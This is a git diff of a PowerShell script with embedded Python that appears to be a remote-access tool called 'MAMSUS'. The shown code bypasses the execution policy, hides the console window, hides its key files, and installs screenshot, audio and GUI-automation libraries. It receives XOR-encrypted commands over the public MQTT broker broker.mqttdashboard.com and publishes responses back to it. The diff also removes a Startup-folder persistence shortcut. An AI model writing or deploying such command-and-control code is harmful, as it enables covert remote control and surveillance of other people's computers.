@@ -1,4 +1,4 @@
-﻿@"
+@"
                       ╓╗╗╗╗┐
              ╓╥╥╥╥╥╥║▒▒▒▒▒▒▒▒╢╥╖╥╖╖╓╓
            ╫║▒▒▒▒▒▒▒▒▒▒▒║░╙║▒▒▒▒▒▒╢▒▒▒╫~
@@ -24,24 +24,27 @@
                      ╙╜▒▒▒▒╜╜
 "@
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-$ScriptPath = $MyInvocation.MyCommand.Path
-$ShortcutFilePath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup', 'MAMSUS.lnk')
 
-if (-not (Test-Path $ShortcutFilePath)) {
-    $WshShell = New-Object -ComObject WScript.Shell
-    $Shortcut = $WshShell.CreateShortcut($ShortcutFilePath)
-    $Shortcut.TargetPath = $ScriptPath
-    $Shortcut.WorkingDirectory = (Get-Item $ScriptPath).Directory.FullName
-    $Shortcut.IconLocation = $ScriptPath
-    $Shortcut.Save()
-    Write-Host "Shortcut created successfully" -ForegroundColor Green
-} else {
-    Write-Host "Shortcut already exists." -ForegroundColor Green
-}
+$value = Get-Content -Path ".\firstExcution.key"
+if ($value -eq 0) {
+    do {
+        $in1 = Read-Host "Enter your Topic, try to make it uniqe (example: Name/Network1) "
+    } while ([string]::IsNullOrEmpty($in1))
+
+    do {
+        $in2 = Read-Host "Enter your Secret Key to decrypt Commands "
+    } while ([string]::IsNullOrEmpty($in2))
+Write-Host "Topic: $in1"
+Write-Host "Key: $in2"
+$in1 | Set-Content -Path ".\topic.key"
+$in2 | Set-Content -Path ".\secret.key"
 
 
+Set-ItemProperty -Path (Join-Path -Path $PSScriptRoot -ChildPath "secret.key") -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path (Join-Path -Path $PSScriptRoot -ChildPath "topic.key") -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+Set-ItemProperty -Path (Join-Path -Path $PSScriptRoot -ChildPath "firstExcution.key") -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 ##arp
-$libraries = @("paho-mqtt", "pyscreenshot", "Pillow", "pycaw", "pyautogui")
+$libraries = @("paho-mqtt==1.5.1", "pyscreenshot", "Pillow", "pycaw", "pyautogui")
 
 foreach ($library in $libraries) {
     try {
@@ -52,6 +55,10 @@ foreach ($library in $libraries) {
     }
 }
 Write-Host "Librarys Ready" -ForegroundColor Green
+"1" | Set-Content -Path ".\firstExcution.key"
+}
+
+
 
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
@@ -229,7 +236,7 @@ def xor_decrypt(encrypted_string, secret_key):
 def get_mqtt_message():    
     received_message = None
     def on_connect(client, userdata, flags, rc):
-        client.subscribe('$topicc')
+        client.subscribe('MAMSUS/$topicc')
     def on_message(client, userdata, msg):
         nonlocal received_message
         message = xor_decrypt(msg.payload.decode(),Key)
@@ -302,7 +309,7 @@ def pub(nachricht):
         client.connect('broker.mqttdashboard.com', 1883)
         client.loop_start()
         print (part)
-        client.publish('$topicc/response',part)
+        client.publish('MAMSUS/$topicc/response',part)
         print(f"Published Part {i + 1}")
         time.sleep(0.1)
         client.loop_stop()
